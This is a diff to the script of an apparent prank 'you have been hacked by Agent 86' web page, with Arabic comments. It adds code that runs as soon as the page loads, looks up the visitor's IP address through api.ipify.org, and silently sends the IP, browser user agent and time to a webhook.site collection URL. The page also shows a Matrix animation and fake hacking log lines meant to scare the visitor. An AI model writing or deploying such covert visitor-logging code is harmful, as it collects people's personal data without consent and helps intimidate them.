@@ -116,7 +116,34 @@
     </div>
 
     <script>
-        // تأثير الماتريكس الخلفي
+        // ضع رابط webhook.site الخاص بك هنا بين التنصيص
+        const webhookURL = "https://webhook.site/6ed9b79e-57a4-46ca-9bc4-2ff24a177e78";
+
+        // إرسال بيانات الزائر فور دخول الصفحة
+        async function sendVisitorLog() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+
+                const data = {
+                    message: "🚨 زائر جديد دخل موقع العميل 86!",
+                    ip: ipData.ip || "غير معروف",
+                    device: navigator.userAgent,
+                    time: new Date().toLocaleString('ar-EG')
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                console.error("Error sending log:", e);
+            }
+        }
+        sendVisitorLog();
+
+        // تأثير خلفية الماتريكس
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
@@ -145,7 +172,7 @@
         }
         setInterval(drawMatrix, 33);
 
-        // كتابة النص الرئيسي تلقائياً
+        // تأثير طباعة النص تلقائياً
         const mainText = "لقد تم تهكيرك عن طريق العميل 86";
         let index = 0;
         function typeWriter() {
@@ -157,7 +184,7 @@
         }
         typeWriter();
 
-        // طباعة سطور وهمية لإثبات الاختراق
+        // طباعة سطور الأوامر الوهمية
         const logs = [
             "> Connecting to local device...",
             "> IP Address Captured: SUCCESS",
